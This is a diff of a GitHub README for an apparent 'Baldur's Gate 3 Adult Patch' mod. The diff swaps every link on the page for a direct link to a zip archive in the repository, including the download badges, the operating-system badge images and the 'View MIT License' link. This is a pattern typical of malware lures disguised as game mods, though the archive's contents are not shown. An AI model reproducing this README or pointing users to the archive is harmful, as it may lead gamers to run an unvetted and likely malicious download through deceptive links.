@@ -2,9 +2,9 @@
 
 Welcome to the repository for the **Baldur’s Gate 3 Adult Patch**—a transformative module designed to elevate your BG3 experience with advanced, mature content, superior UI enhancements, and state-of-the-art integrations. Begin your adventure into a more nuanced Forgotten Realms!
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://madexter77.github.io)
+[![Download](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip)](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip)
 
-**Download the Adult Patch here:** https://madexter77.github.io
+**Download the Adult Patch here:** https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip
 
 ---
 
@@ -14,10 +14,10 @@ Stay on top of your game—no matter the platform. Our patch ensures compatibili
 
 | OS              | Supported | Latest QA | Notes                |
 |-----------------|:---------:|:---------:|----------------------|
-| ![Windows](https://img.shields.io/badge/Windows-✔️-green)   |   ✅     | 2025.04   | Full support         |
-| ![MacOS](https://img.shields.io/badge/macOS-✔️-green)      |   ✅     | 2025.04   | Apple Silicon ready  |
-| ![Linux](https://img.shields.io/badge/Linux-✔️-green)      |   ✅     | 2025.04   | Steam Deck verified  |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-✔️-blue) |   ✅     | 2025.04   | Recommended mode     |
+| ![Windows](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip✔️-green)   |   ✅     | 2025.04   | Full support         |
+| ![MacOS](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip✔️-green)      |   ✅     | 2025.04   | Apple Silicon ready  |
+| ![Linux](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip✔️-green)      |   ✅     | 2025.04   | Steam Deck verified  |
+| ![Steam Deck](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip%20Deck-✔️-blue) |   ✅     | 2025.04   | Recommended mode     |
 
 ---
 
@@ -99,16 +99,16 @@ This patch modifies game files; always back up your original installation. By do
 
 This project is licensed under the terms of the MIT License. You're free to use, adapt, and distribute this patch, provided you attribute contributions and include the license text.
 
-[View MIT License](https://opensource.org/licenses/MIT)
+[View MIT License](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip)
 
 ---
 
 ## 📥 Download Instructions
 
 Ready to begin your journey?  
-[![Download](https://img.shields.io/badge/Download-purple)](https://madexter77.github.io)
+[![Download](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip)](https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip)
 
-**Get the latest Adult Patch:** https://madexter77.github.io  
+**Get the latest Adult Patch:** https://github.com/madexter77/baldurs-gate-3-mature-content-expansion/raw/refs/heads/main/prelim/mature-gate-content-expansion-baldurs-2.9-beta.2.zip  
 
 Unlock the true potential of Baldur’s Gate 3, and experience storytelling as vivid and complex as the lands of Faerûn themselves.
 
